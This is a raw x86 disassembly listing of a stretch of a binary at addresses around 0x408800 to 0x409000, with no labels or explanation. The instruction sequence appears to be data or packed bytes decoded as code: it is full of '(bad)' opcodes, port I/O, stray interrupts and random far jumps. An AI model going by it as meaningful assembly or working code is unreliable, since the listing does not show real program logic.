  40883b:	mov    edx,DWORD PTR [esi-0x1875d740]
  408841:	scas   eax,DWORD PTR es:[edi]
  408842:	sub    ebp,DWORD PTR [edi]
  408844:	fadd   st(1),st
  408846:	pop    ebx
  408847:	pop    edx
  408848:	and    BYTE PTR [esi],bh
  40884a:	jo     0x4088b6
  40884c:	scas   eax,DWORD PTR es:[edi]
  40884d:	fild   DWORD PTR [edi-0x274ec2e6]
  408853:	add    eax,edi
  408855:	hlt    
  408856:	push   esp
  408857:	or     DWORD PTR [ebp-0x703cdb3f],ebp
  40885d:	rcl    BYTE PTR [esi-0x77fbdcc3],cl
  408863:	mov    ah,BYTE PTR [edi+0x2e]
  408866:	aam    0xb2
  408868:	imul   esi,DWORD PTR ds:0x8b1ba0ad,0xffffffeb
  40886f:	in     eax,dx
  408870:	adc    dl,BYTE PTR [eax+0x17]
  408873:	aam    0xcb
  408875:	icebp  
  408876:	sbb    al,0x1a
  408878:	nop
  408879:	rcr    BYTE PTR [esi],cl
  40887b:	adc    dl,BYTE PTR [esi+0x3]
  40887e:	nop
  40887f:	mov    esp,0xa737134d
  408884:	jmp    0x4cb6:0x87f2b69c
  40888b:	xor    ch,ah
  40888d:	inc    edx
  40888e:	push   0x5800b42b
  408893:	xchg   BYTE PTR [ecx+0x3d86b595],dh
  408899:	icebp  
  40889a:	pop    edx
  40889b:	mov    al,0x15
  40889d:	push   es
  40889e:	cmp    BYTE PTR [ebx+edx*1-0x29],dh
  4088a2:	adc    DWORD PTR [ecx-0x80],ebx
  4088a5:	mov    ds:0xe7bf083c,eax
  4088aa:	js     0x40888d
  4088ac:	shr    BYTE PTR [ebx+ecx*2-0x60],0x44
  4088b1:	sar    BYTE PTR [esi+0x37],1
  4088b4:	int    0x4f
  4088b6:	jle    0x4088fa
  4088b8:	ficom  WORD PTR [edi-0x61]
  4088bb:	xor    BYTE PTR [esi-0x56],ah
  4088be:	pusha  
  4088bf:	pop    edx
  4088c0:	dec    ebx
  4088c1:	push   edi
  4088c2:	xchg   ebp,eax
  4088c3:	iret   
  4088c4:	mov    bh,0xfd
  4088c6:	div    bl
  4088c8:	push   ss
  4088c9:	sub    DWORD PTR [ecx-0x80],ebp
  4088cc:	jo     0x408936
  4088ce:	loopne 0x408915
  4088d0:	nop
  4088d1:	mov    cl,cl
  4088d3:	jnp    0x4088cd
  4088d5:	push   0x49e1ac5b
  4088da:	lahf   
  4088db:	xor    al,0xee
  4088dd:	xor    eax,0xe1b2cc6d
  4088e2:	or     ecx,ebx
  4088e4:	pop    es
  4088e5:	jbe    0x408965
  4088e7:	leave  
  4088e8:	inc    eax
  4088e9:	jle    0x4088b3
  4088eb:	ds mov dh,0x1d
  4088ee:	fidiv  DWORD PTR [edi]
  4088f0:	lods   eax,DWORD PTR ds:[esi]
  4088f1:	mov    ebp,0xaa69cfc2
  4088f6:	add    edx,ebx
  4088f8:	mov    ebx,DWORD PTR [esi-0x71]
  4088fb:	mov    ebx,0x26e15260
  408900:	arpl   cx,sp
  408902:	in     eax,0xa2
  408904:	push   ebx
  408905:	jl     0x4088a9
  408907:	aas    
  408908:	rep stos DWORD PTR es:[edi],eax
  40890a:	aaa    
  40890b:	aas    
  40890c:	dec    ebp
  40890d:	fdiv   DWORD PTR [esi+0xe]
  408910:	jp     0x4088ef
  408912:	sub    eax,0x61e94725
  408917:	dec    esi
  408918:	or     eax,0x80d5e785
  40891d:	clc    
  40891e:	loopne 0x40899b
  408920:	jno    0x40898d
  408922:	xchg   sp,ax
  408924:	mov    ds:0x69d9a84f,eax
  408929:	aad    0x61
  40892b:	test   bh,bh
  40892d:	inc    eax
  40892e:	popa   
  40892f:	hlt    
  408930:	mov    esp,0xf2e13fe6
  408935:	jmp    0x4133:0xeac73889
  40893c:	mov    ebp,0xe6bac797
  408941:	cmc    
  408942:	mov    ecx,0x71f4d9c8
  408947:	stc    
  408948:	rol    DWORD PTR [ecx],1
  40894a:	mov    al,ds:0x498b80eb
  40894f:	push   DWORD PTR [ecx]
  408951:	loop   0x408924
  408953:	pop    edx
  408954:	add    eax,0x756a3594
  408959:	add    al,0x79
  40895b:	cli    
  40895c:	retf   0x2025
  40895f:	fld    DWORD PTR [edi-0x3716189d]
  408965:	ja     0x408904
  408967:	in     al,dx
  408968:	mov    ss,WORD PTR [ebx-0x46]
  40896b:	mov    esp,0xcef57f15
  408970:	sub    bl,BYTE PTR [esi-0x42]
  408973:	xchg   ecx,eax
  408974:	imul   ebp,DWORD PTR [ebx-0x1a703498],0xffffff8a
  40897b:	mov    cl,0xa1
  40897d:	sub    edi,DWORD PTR [ebx+0x28d12791]
  408983:	mov    bh,BYTE PTR [esi]
  408985:	mov    dl,0xf
  408987:	scas   al,BYTE PTR es:[edi]
  408988:	dec    edi
  408989:	jl     0x4089eb
  40898b:	mov    BYTE PTR [ecx+0x3a],al
  40898e:	lea    edx,[ebx+eiz*1]
  408991:	xchg   edx,eax
  408992:	repz call 0x1e23:0xfde20d90
  40899a:	push   cs
  40899b:	(bad)  
  40899c:	out    dx,eax
  40899d:	jle    0x40893a
  40899f:	popf   
  4089a0:	push   0x48
  4089a2:	pop    ss
  4089a3:	mov    ecx,0x74eecc81
  4089a8:	pop    es
  4089a9:	mov    dh,0x1f
  4089ab:	inc    ebx
  4089ac:	lahf   
  4089ad:	cwde   
  4089ae:	fsubr  st(6),st
  4089b0:	test   BYTE PTR [eax+eax*2],0x10
  4089b4:	xor    eax,0xa06aaf5
  4089b9:	jl     0x4089ec
  4089bb:	or     bh,BYTE PTR [ebx-0x80]
  4089be:	push   0xf929c468
  4089c3:	dec    ebx
  4089c4:	and    BYTE PTR ds:0x12a0c77a,0x29
  4089cb:	pop    ss
  4089cc:	jnp    0x4089e5
  4089ce:	lods   eax,DWORD PTR ds:[esi]
  4089cf:	test   eax,0xc2cd325
  4089d4:	cmp    BYTE PTR [edx],bh
  4089d6:	sar    BYTE PTR [ecx-0x1],0x33
  4089da:	xor    BYTE PTR [eax-0x7b],0x74
  4089de:	es stos BYTE PTR es:[edi],al
  4089e0:	jg     0x408a56
  4089e2:	cmp    bl,BYTE PTR [ebp+0x30fa2c8c]
  4089e8:	xor    ch,dl
  4089ea:	scas   eax,DWORD PTR es:[edi]
  4089eb:	fwait
  4089ec:	jge    0x40898a
  4089ee:	cmp    edx,DWORD PTR [edx-0x15]
  4089f1:	mov    ebp,0xde68d5f5
  4089f6:	sbb    al,BYTE PTR [esi-0x53]
  4089f9:	jge    0x4089d2
  4089fb:	movq   QWORD PTR [edx-0x35],mm6
  4089ff:	mov    ecx,0x29abe52
  408a04:	fst    DWORD PTR [ebx+0x65def00d]
  408a0a:	jo     0x408a6d
  408a0c:	shl    DWORD PTR [ecx-0x5e],0xb9
  408a10:	add    BYTE PTR [esp+ebp*4],0xd
  408a14:	inc    ebp
  408a15:	dec    ebp
  408a16:	or     al,0x18
  408a18:	cmp    esi,DWORD PTR cs:[eax-0x5c]
  408a1c:	jae    0x4089ee
  408a1e:	or     eax,0xcf2661b7
  408a23:	jp     0x4089d5
  408a25:	xchg   ebp,eax
  408a26:	ins    BYTE PTR es:[edi],dx
  408a27:	fmul   DWORD PTR [edi+0x7bfc6945]
  408a2d:	(bad)  
  408a2e:	ja     0x408a82
  408a30:	int    0x2e
  408a32:	cwde   
  408a33:	push   ds
  408a34:	shl    BYTE PTR [edi+0x50],0x67
  408a38:	xchg   DWORD PTR [eax],eax
  408a3a:	cwde   
  408a3b:	push   ds
  408a3c:	dec    ebx
  408a3d:	sub    edx,DWORD PTR ds:0xd086850a
  408a43:	dec    ebp
  408a44:	comiss xmm6,DWORD PTR [ebx*4+0x3e4ad0]
  408a4c:	rol    edi,0x76
  408a4f:	lds    edi,FWORD PTR [ebx+ecx*2-0x2d]
  408a53:	scas   eax,DWORD PTR es:[edi]
  408a54:	mov    ecx,0xc91bb86f
  408a59:	push   cs
  408a5a:	mov    edi,0xef8f513b
  408a5f:	inc    esi
  408a60:	mov    cl,0x4e
  408a62:	stc    
  408a63:	repz jl 0x408a0f
  408a66:	inc    esi
  408a67:	retf   
  408a68:	rcr    DWORD PTR [ebx],1
  408a6a:	stos   DWORD PTR es:[edi],eax
  408a6b:	push   0x3c
  408a6d:	rcl    dh,0xff
  408a70:	fild   DWORD PTR [ebp+0x37]
  408a73:	sub    BYTE PTR [eax],dh
  408a75:	pop    ebx
  408a76:	cmp    al,0xa3
  408a78:	jg     0x408a05
  408a7a:	pop    eax
  408a7b:	mov    DWORD PTR [edx+ecx*1-0x46],esi
  408a7f:	shr    BYTE PTR [ecx-0x38a68dd6],cl
  408a85:	sti    
  408a86:	ins    BYTE PTR es:[edi],dx
  408a87:	sub    DWORD PTR [eax+eax*1+0x1a],edi
  408a8b:	and    DWORD PTR ds:0x43dc3b31,ebp
  408a91:	jae    0x408b07
  408a93:	out    dx,al
  408a94:	aad    0xf3
  408a96:	jecxz  0x408ab5
  408a98:	jo     0x408afd
  408a9a:	jmp    0x408aef
  408a9c:	into   
  408a9d:	mov    bh,0x28
  408a9f:	xchg   ecx,eax
  408aa0:	jmp    0x408aa2
  408aa2:	call   0xa5a13609
  408aa7:	lods   al,BYTE PTR ds:[esi]
  408aa8:	mov    ds:0xa7b2be22,eax
  408aad:	lods   eax,DWORD PTR ds:[esi]
  408aae:	int    0xc9
  408ab0:	aas    
  408ab1:	mov    eax,0x21004686
  408ab6:	pop    ecx
  408ab7:	and    BYTE PTR [edx],ch
  408ab9:	lods   al,BYTE PTR ds:[esi]
  408aba:	(bad)  
  408abc:	add    DWORD PTR [ebp-0x5c5ddaed],ebp
  408ac2:	jbe    0x408a7f
  408ac4:	adc    ah,BYTE PTR [ecx+0x70]
  408ac7:	sbb    edi,eax
  408ac9:	sub    BYTE PTR [ebx+0x71],ah
  408acc:	jne    0x408af7
  408ace:	add    cl,ah
  408ad0:	popa   
  408ad1:	cmp    esp,DWORD PTR ds:[ebx]
  408ad4:	xchg   ebx,eax
  408ad5:	inc    ebp
  408ad6:	shufps xmm6,XMMWORD PTR [edi+0x60],0xee
  408adb:	retf   0xab0e
  408ade:	mov    edx,0x19a78099
  408ae3:	mov    edi,0xd8a0bc31
  408ae8:	add    al,0x41
  408aea:	and    BYTE PTR [esi],0xa0
  408aed:	fsubrp st(7),st
  408aef:	sub    cl,ch
  408af1:	addr16 inc edi
  408af3:	jnp    0xbde6f3b0
  408af9:	jle    0x408a8a
  408afb:	pop    ecx
  408afc:	in     al,0xa9
  408afe:	rcl    DWORD PTR [eax+0x7389e705],0x9a
  408b05:	cs mov dh,0x62
  408b08:	sti    
  408b09:	xchg   ebx,eax
  408b0a:	addr16 inc eax
  408b0c:	(bad)  
  408b0d:	stos   BYTE PTR es:[edi],al
  408b0e:	jb     0x408b7f
  408b10:	inc    ebp
  408b11:	out    dx,eax
  408b12:	push   esi
  408b13:	lock mov ecx,0xeb0c3a2a
  408b19:	mov    ah,0x55
  408b1b:	(bad)  
  408b1c:	sbb    ch,al
  408b1e:	cmp    cl,BYTE PTR [ebp+0x6d]
  408b21:	das    
  408b22:	lahf   
  408b23:	ret    0x5bb6
  408b26:	aas    
  408b27:	pop    ecx
  408b28:	cdq    
  408b29:	cld    
  408b2a:	mov    esi,0xd88243db
  408b2f:	adc    eax,0x6c2285ea
  408b34:	aas    
  408b35:	mov    ds:0xb9d24351,al
  408b3a:	inc    edx
  408b3b:	push   0x8c74b96
  408b40:	loopne 0x408b48
  408b42:	mov    edi,0x156d7d4b
  408b47:	jbe    0x408bbf
  408b49:	iret   
  408b4a:	ss inc esp
  408b4c:	and    eax,0x327b1e27
  408b51:	jnp    0x408ada
  408b53:	(bad)  
  408b54:	je     0x408ba4
  408b56:	xor    DWORD PTR [ebx-0x280aefa1],0x4dced853
  408b60:	sub    ch,dl
  408b62:	shl    DWORD PTR [esi-0x1b],0xb7
  408b66:	jmp    0x7ca2ccb1
  408b6b:	pop    esp
  408b6c:	bound  ecx,QWORD PTR [ecx]
  408b6e:	mov    ds:0xee79cecf,al
  408b73:	imul   ebx,DWORD PTR [ecx-0xa6183b5],0x97d4e9ab
  408b7d:	in     al,dx
  408b7e:	in     eax,0x53
  408b80:	dec    ecx
  408b81:	push   ss
  408b82:	push   ss
  408b83:	jns    0x408b40
  408b85:	jg     0x408bad
  408b87:	loop   0x408bf4
  408b89:	jmp    0x408b7c
  408b8b:	loop   0x408b71
  408b8d:	daa    
  408b8e:	xchg   DWORD PTR [edi-0xc],esi
  408b91:	loopne 0x408b9a
  408b93:	mov    ss,WORD PTR [esi]
  408b95:	arpl   WORD PTR [eax-0x21],ax
  408b98:	int    0x2c
  408b9a:	daa    
  408b9b:	push   ds
  408b9c:	xor    DWORD PTR [ebx-0x2e],esi
  408b9f:	sbb    cl,BYTE PTR [ebp-0x59]
  408ba2:	cdq    
  408ba3:	add    dh,BYTE PTR [ecx+0x25aa1ce6]
  408ba9:	sub    eax,eax
  408bab:	and    edx,edx
  408bad:	xchg   ebx,eax
  408bae:	jg     0x408b43
  408bb0:	fyl2xp1 
  408bb2:	es out 0xbf,al
  408bb5:	ret    
  408bb6:	mov    ch,0x64
  408bb8:	rol    BYTE PTR [esi],1
  408bba:	shl    DWORD PTR [ecx],cl
  408bbc:	not    ebx
  408bbe:	jle    0x408b9b
  408bc0:	call   0x2030:0x5b1d4712
  408bc7:	test   eax,0xebe69668
  408bcc:	mov    dl,0xeb
  408bce:	sbb    al,0x7d
  408bd0:	(bad)  
  408bd1:	popa   
  408bd2:	adc    DWORD PTR [edx],esi
  408bd4:	je     0x408c08
  408bd6:	ds pop ebx
  408bd8:	in     al,0x76
  408bda:	sub    al,0xea
  408bdc:	mov    cl,0x87
  408bde:	and    BYTE PTR [esi+0x1e],dl
  408be1:	ss ins BYTE PTR es:[edi],dx
  408be3:	mov    al,ds:0x9dcdf15f
  408be8:	scas   al,BYTE PTR es:[edi]
  408be9:	inc    ecx
  408bea:	xchg   edi,eax
  408beb:	adc    ecx,esi
  408bed:	and    ecx,ebx
  408bef:	jge    0x408c5c
  408bf1:	iret   
  408bf2:	cmp    eax,0xfc53fead
  408bf7:	push   ecx
  408bf8:	fnsave [ebx]
  408bfa:	enter  0x1ad2,0x42
  408bfe:	mov    ah,0x9a
  408c00:	int    0x3e
  408c02:	xchg   esp,eax
  408c03:	mov    DWORD PTR [eax+0x335924bb],ecx
  408c09:	(bad)  
  408c0b:	dec    esp
  408c0c:	push   ecx
  408c0d:	xor    ch,BYTE PTR [esi-0x6208130f]
  408c13:	fcom   DWORD PTR [edx-0x76]
  408c16:	xor    eax,0x59d48523
  408c1b:	int    0x2e
  408c1d:	adc    BYTE PTR [ebx+0x33],bl
  408c20:	mov    edi,0x28fc564c
  408c25:	mov    edx,cs
  408c27:	inc    ebx
  408c28:	pop    es
  408c29:	adc    dl,BYTE PTR [ebx+0x72]
  408c2c:	mov    ebx,0x69b54184
  408c31:	xlat   BYTE PTR ds:[ebx]
  408c32:	jg     0x408bcd
  408c34:	and    al,0x63
  408c36:	add    ebp,DWORD PTR [edx-0x15]
  408c39:	test   al,0xda
  408c3b:	fcom   DWORD PTR [ebx+0x6342a50b]
  408c41:	retf   
  408c42:	(bad)  
  408c43:	cmc    
  408c44:	jmp    0xe08b:0x65d3fe7a
  408c4b:	push   ebp
  408c4c:	rcl    DWORD PTR [ebp-0x7],0x76
  408c50:	jmp    0xd256:0xbf5fbfe7
  408c57:	jmp    0x40926cad
  408c5c:	not    BYTE PTR [eax]
  408c5e:	jmp    0x408bef
  408c60:	jmp    0x408c6d
  408c62:	popa   
  408c63:	test   BYTE PTR [edx],ah
  408c65:	push   eax
  408c66:	fdivr  QWORD PTR [ebx-0x6c2e94ac]
  408c6c:	je     0x408c05
  408c6e:	fcmove st,st(6)
  408c70:	push   edx
  408c71:	inc    ecx
  408c72:	dec    ecx
  408c73:	pop    edx
  408c74:	pop    es
  408c75:	iret   
  408c76:	mov    ebx,0xfea26ea8
  408c7b:	cmp    bh,BYTE PTR [edi]
  408c7d:	cmp    eax,0xbddfb97e
  408c82:	cmp    al,0xeb
  408c84:	and    ah,BYTE PTR [edi]
  408c86:	sbb    ecx,DWORD PTR [eax]
  408c88:	ror    DWORD PTR [edx-0x28c8607a],1
  408c8e:	mov    ?,esp
  408c90:	fsubr  DWORD PTR [edx]
  408c92:	inc    esi
  408c93:	dec    ecx
  408c94:	mov    esp,0x71c9794f
  408c99:	in     eax,dx
  408c9a:	or     al,0xa5
  408c9c:	scas   al,BYTE PTR es:[edi]
  408c9d:	mov    eax,ds:0x257a39b0
  408ca2:	add    DWORD PTR [ebp+0x7d],edi
  408ca5:	sub    BYTE PTR [edi+0x255e8fda],cl
  408cab:	fadd   DWORD PTR [edi+0x67]
  408cae:	divps  xmm4,XMMWORD PTR [edx+0x5f]
  408cb2:	repnz (bad) 
  408cb4:	aas    
  408cb5:	jnp    0x408caa
  408cb7:	lds    esi,FWORD PTR ds:0x9c281734
  408cbd:	fidivr DWORD PTR [esi]
  408cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cc0:	cdq    
  408cc1:	inc    edx
  408cc2:	cmp    eax,0xa3ee8d0b
  408cc7:	(bad)  
  408cc8:	and    BYTE PTR [esi-0xf1ffe1b],ah
  408cce:	inc    ebx
  408ccf:	jae    0x408d22
  408cd1:	dec    esp
  408cd2:	xor    DWORD PTR [edx+eiz*1+0x36],ebp
  408cd6:	jbe    0x408cc3
  408cd8:	add    cl,BYTE PTR [esi+0x56b7904e]
  408cde:	fld    DWORD PTR [eax-0x5b]
  408ce1:	sub    eax,0x457466d1
  408ce6:	push   esi
  408ce7:	mul    DWORD PTR [ebx]
  408ce9:	inc    ebx
  408cea:	ret    0xc8ae
  408ced:	popa   
  408cee:	(bad)  
  408cf0:	jecxz  0x408cef
  408cf2:	(bad)  
  408cf3:	loope  0x408ca8
  408cf5:	jle    0x408ce4
  408cf7:	sub    eax,0x1a2eedd9
  408cfc:	sti    
  408cfd:	inc    edx
  408cfe:	cmp    al,0x35
  408d00:	jge    0x408c8f
  408d02:	pop    esi
  408d03:	mov    al,0x28
  408d05:	addr16 sti 
  408d07:	data16 je 0x408d67
  408d0a:	mov    ch,0x86
  408d0c:	in     eax,dx
  408d0d:	sub    al,0xb7
  408d0f:	retf   0x233
  408d12:	inc    eax
  408d13:	adc    eax,0xf5ecd9ca
  408d18:	retf   0x1d54
  408d1b:	mov    esp,0xccc1e06b
  408d20:	into   
  408d21:	retf   0x977b
  408d24:	dec    ecx
  408d25:	fwait
  408d26:	cmp    edx,DWORD PTR [esi+0x412aacc4]
  408d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d2d:	hlt    
  408d2e:	pop    ebp
  408d2f:	into   
  408d30:	cwde   
  408d31:	xchg   esp,eax
  408d32:	rcr    ebp,1
  408d34:	nop
  408d35:	mov    ecx,DWORD PTR [ebp+0x2e4def61]
  408d3b:	ret    0x433b
  408d3e:	fs nop
  408d40:	mov    al,BYTE PTR [esi+0xb]
  408d43:	sbb    BYTE PTR [eax+edx*2+0x105e8988],dl
  408d4a:	xor    ebp,edi
  408d4c:	stos   BYTE PTR es:[edi],al
  408d4d:	push   eax
  408d4e:	mov    fs,WORD PTR ds:[eax+0x2c072583]
  408d55:	test   eax,0x5a2862c9
  408d5a:	fiadd  WORD PTR [ecx]
  408d5c:	jmp    0xa713603
  408d61:	popf   
  408d62:	jns    0x408d48
  408d64:	sub    BYTE PTR [edx+edx*4-0x4e],0xd
  408d69:	xor    al,0x4a
  408d6b:	fsubrp st(3),st
  408d6d:	cld    
  408d6e:	imul   ebp,DWORD PTR [ecx],0x49
  408d71:	mov    edi,0x1ff81b39
  408d76:	cmp    BYTE PTR [ebx+edi*2],0xf2
  408d7a:	jmp    0x408d0d
  408d7c:	jecxz  0x408d85
  408d7e:	adc    eax,0xb9d08467
  408d83:	inc    ebp
  408d84:	loop   0x408d5e
  408d86:	push   esp
  408d87:	inc    ebx
  408d88:	jne    0x408d45
  408d8a:	les    esi,FWORD PTR [esi]
  408d8c:	addr16 mov edi,0x51e90731
  408d92:	mov    dh,0xb4
  408d94:	int3   
  408d95:	fisttp WORD PTR [eax]
  408d97:	xor    dh,al
  408d99:	pop    ebp
  408d9a:	rcl    dh,1
  408d9c:	jl     0x408dd6
  408d9e:	repz (bad) 
  408da0:	mov    WORD PTR [ecx+edi*2+0x79521635],cs
  408da7:	sub    al,0x9
  408da9:	cmp    esp,DWORD PTR [ebp+0x1fcf7924]
  408daf:	cld    
  408db0:	out    0xcc,al
  408db2:	mov    edi,0xf0750eae
  408db7:	fwait
  408db8:	lods   al,BYTE PTR ds:[esi]
  408db9:	les    eax,FWORD PTR [ebx+0x9]
  408dbc:	stc    
  408dbd:	and    BYTE PTR [ebx+eax*1-0x52ec7b36],0x3a
  408dc5:	sbb    ebx,DWORD PTR [esp+ebx*8]
  408dc8:	fldlg2 
  408dca:	adc    bl,BYTE PTR [ecx+0x38]
  408dcd:	ins    DWORD PTR es:[edi],dx
  408dce:	add    DWORD PTR [ecx+0x4b],ecx
  408dd1:	repnz xchg bp,ax
  408dd4:	add    BYTE PTR [eax+0x64],dh
  408dd7:	out    dx,al
  408dd8:	push   ebx
  408dd9:	shl    esi,0xa0
  408ddc:	jno    0x408e36
  408dde:	inc    edx
  408ddf:	loop   0x408e39
  408de1:	or     eax,0xdcc1bf55
  408de6:	cwde   
  408de7:	mov    ch,0x1
  408de9:	mov    al,ds:0x1fec6fb
  408dee:	xchg   edi,eax
  408def:	lods   eax,DWORD PTR ds:[esi]
  408df0:	pop    edx
  408df1:	cmp    bh,BYTE PTR [ebp+0x3a]
  408df4:	jno    0x408dd0
  408df6:	push   0xffffff8d
  408df8:	mov    fs,ebx
  408dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dfb:	lods   eax,DWORD PTR ds:[esi]
  408dfc:	mov    esp,0x73e358ae
  408e01:	imul   ebx,DWORD PTR [edi-0x223107db],0x37a706f0
  408e0b:	fcom   QWORD PTR [ebx]
  408e0d:	jb     0x408e3c
  408e0f:	add    eax,0xfeba23d6
  408e14:	(bad)  
  408e15:	mov    ecx,0x8e0b75b1
  408e1a:	jge    0x408e3d
  408e1c:	fldcw  WORD PTR [ebx]
  408e1e:	ins    BYTE PTR es:[edi],dx
  408e1f:	call   0x22a:0xf10732a3
  408e26:	js     0x408dc1
  408e28:	in     eax,0x8
  408e2a:	aad    0x46
  408e2c:	sbb    eax,0xc77db1dc
  408e31:	inc    ebp
  408e32:	sbb    cl,BYTE PTR [ecx+0x58e6e301]
  408e38:	and    al,0x8e
  408e3a:	aaa    
  408e3b:	mov    dh,0xea
  408e3d:	add    ah,BYTE PTR [eax+0x28]
  408e40:	xchg   esi,eax
  408e41:	inc    edi
  408e42:	pusha  
  408e43:	add    DWORD PTR [edx+0x34b8325d],esp
  408e49:	aam    0xaf
  408e4b:	cmp    eax,DWORD PTR ds:0x505cf87c
  408e51:	mov    ds:0x55819ed1,al
  408e56:	push   ebx
  408e57:	(bad)  
  408e58:	push   cs
  408e59:	pop    ds
  408e5a:	daa    
  408e5b:	cmp    eax,0x199ec78
  408e60:	sub    esp,DWORD PTR [esi+0x14]
  408e63:	fld    QWORD PTR [ebp+0x13119ca8]
  408e69:	gs ja  0x408e01
  408e6c:	aam    0x79
  408e6e:	ds pop edx
  408e70:	stc    
  408e71:	mul    BYTE PTR [esi]
  408e73:	mov    BYTE PTR [esi+0x6372d10f],al
  408e79:	xchg   ebx,eax
  408e7a:	dec    edi
  408e7b:	fld    QWORD PTR [esi]
  408e7d:	push   ds
  408e7e:	cmc    
  408e7f:	mov    edx,0x2769d535
  408e84:	jno    0x408e11
  408e86:	stc    
  408e87:	add    ebx,DWORD PTR [esi+0x8]
  408e8a:	push   ecx
  408e8b:	dec    esp
  408e8c:	retf   0x6ba8
  408e8f:	cwde   
  408e90:	out    0xfa,eax
  408e92:	pop    edx
  408e93:	std    
  408e94:	dec    edx
  408e95:	cmp    al,0x1d
  408e97:	jp     0x408e89
  408e99:	pop    ebx
  408e9a:	or     BYTE PTR [eax-0x10],bh
  408e9d:	push   edx
  408e9e:	aad    0x53
  408ea0:	jp     0x408e92
  408ea2:	movntq QWORD PTR [eax+0x5ecac1b1],mm2
  408ea9:	jmp    0xfdbdbc9
  408eae:	xor    BYTE PTR [edi],ah
  408eb0:	retf   
  408eb1:	enter  0xa9d1,0xa0
  408eb5:	cmp    bl,al
  408eb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408eb8:	jb     0x408edb
  408eba:	int    0x9c
  408ebc:	popf   
  408ebd:	xchg   edx,eax
  408ebe:	data16 xor al,0xf1
  408ec1:	out    0xd0,al
  408ec3:	imul   eax,esi,0xffffffbf
  408ec6:	or     esp,edx
  408ec8:	test   al,0xf5
  408eca:	ins    DWORD PTR es:[edi],dx
  408ecb:	adc    bl,BYTE PTR [esi+0x28]
  408ece:	ror    DWORD PTR [ecx-0x3f],0x77
  408ed2:	ret    
  408ed3:	jge    0x408e8d
  408ed5:	push   ebx
  408ed6:	mov    es,WORD PTR [ebx-0x2ce76b57]
  408edc:	retf   
  408edd:	jmp    0x408e89
  408edf:	mov    WORD PTR [edi+0x62],gs
  408ee2:	sub    DWORD PTR [ebx+0x3e],edx
  408ee5:	jmp    0x989e:0xdcd6d30e
  408eec:	inc    esp
  408eed:	adc    ch,dh
  408eef:	fmul   QWORD PTR cs:[edx+0x130752ef]
  408ef6:	mov    ch,0x2a
  408ef8:	fmul   st,st(3)
  408efa:	pop    ebx
  408efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408efc:	aam    0x4f
  408efe:	shl    DWORD PTR [ebx-0x71],cl
  408f01:	iret   
  408f02:	lods   al,BYTE PTR ds:[esi]
  408f03:	jae    0x408ede
  408f05:	iret   
  408f06:	mov    dl,0xe6
  408f08:	inc    eax
  408f09:	int3   
  408f0a:	cmp    al,0xab
  408f0c:	adc    eax,0x1586fa
  408f11:	xor    dh,dl
  408f13:	stos   BYTE PTR es:[edi],al
  408f14:	jmp    0x408ec3
  408f16:	test   al,0xc3
  408f18:	in     al,dx
  408f19:	inc    edi
  408f1a:	inc    ebp
  408f1b:	imul   ebp,DWORD PTR [edi+0x46],0x57
  408f1f:	dec    ebx
  408f20:	push   0x6a842493
  408f25:	adc    bh,BYTE PTR [ebp-0x351d4a32]
  408f2b:	mov    dl,0x16
  408f2d:	loopne 0x408ecb
  408f2f:	xchg   ebp,eax
  408f30:	mov    edx,0x970ec29c
  408f35:	xchg   ecx,eax
  408f36:	mov    edi,ss
  408f38:	dec    esp
  408f39:	xlat   BYTE PTR ds:[ebx]
  408f3a:	rcr    DWORD PTR [edi],1
  408f3c:	js     0x408f09
  408f3e:	mul    DWORD PTR [ebx-0x16a71bf]
  408f44:	and    DWORD PTR [esi+0x2c5151f],edx
  408f4a:	jno    0x408fbf
  408f4c:	xlat   BYTE PTR es:[ebx]
  408f4e:	jns    0x408edf
  408f50:	add    DWORD PTR [ebp-0xa],ecx
  408f53:	fisttp WORD PTR [ecx]
  408f55:	mov    ebp,0x579e6c9c
  408f5a:	jno    0x408eee
  408f5c:	mov    ebp,0x29ccd2a7
  408f61:	call   0xfb5c70b0
  408f66:	dec    ebp
  408f67:	sbb    ebp,DWORD PTR [ebx+0x36d366c5]
  408f6d:	es retf 0x32ce
  408f71:	mov    esp,0xc954366a
  408f76:	dec    eax
  408f77:	jp     0x408f9f
  408f79:	popa   
  408f7a:	nop
  408f7b:	int3   
  408f7c:	aaa    
  408f7d:	pop    ecx
  408f7e:	jmp    0x408fc1
  408f80:	leave  
  408f81:	mov    edx,0xaa0e7a2f
  408f86:	(bad)  
  408f87:	retf   
  408f88:	dec    esi
  408f89:	jmp    0x2f465404
  408f8e:	icebp  
  408f8f:	mov    DWORD PTR [eax],0x65459b7
  408f95:	aaa    
  408f96:	or     al,0x91
  408f98:	ror    DWORD PTR [esi+0x7a],1
  408f9b:	stos   DWORD PTR es:[edi],eax
  408f9c:	jecxz  0x408fbb
  408f9e:	(bad)  
  408fa0:	sbb    ebx,DWORD PTR [ebp-0x7f]
  408fa3:	es pop ebx
  408fa5:	js     0x408f52
  408fa7:	sub    eax,0x6b76ce91
  408fac:	push   esp
  408fad:	adc    BYTE PTR [eax+ebx*4+0x3d],0xb2
  408fb2:	idiv   BYTE PTR [esi-0x2a]
  408fb5:	jae    0x408f77
  408fb7:	jbe    0x408f6b
  408fb9:	dec    edx
  408fba:	xchg   ecx,eax
  408fbb:	fist   DWORD PTR [edi]
  408fbe:	addr16 pop esi
  408fc0:	and    BYTE PTR ds:0xb524513f,ch
  408fc6:	ds test eax,0x42d69489
  408fcc:	mov    ebp,0xd8699a8f
  408fd1:	or     eax,0x31aeb3b3
  408fd6:	fadd   QWORD PTR [eax+ebx*4+0x44f242a4]
  408fdd:	leave  
  408fde:	adc    edx,DWORD PTR [edx+0x37]
  408fe1:	inc    edx
  408fe2:	rcr    BYTE PTR [ebx],1
  408fe4:	jg     0x40901a
  408fe6:	popa   
  408fe7:	push   ss
  408fe8:	aad    0x72
  408fea:	inc    edi
  408feb:	cmp    edi,DWORD PTR [ecx+0x1]
  408fee:	or     DWORD PTR [edi+0x1fc89ee5],esi
  408ff4:	cmp    al,0x54
  408ff6:	jb     0x408fec
  408ff8:	xor    esi,ebp
  408ffa:	outs   dx,BYTE PTR ds:[esi]
  408ffb:	in     eax,dx
  408ffc:	xor    al,0x50
  408fff:	pop    ecx
  409000:	jae    0x408f9a
  409002:	inc    ebp
  409003:	mul    DWORD PTR [ecx]
  409005:	sub    eax,0xf965bdf4
  40900a:	fst    QWORD PTR [eax+0x39a7620f]
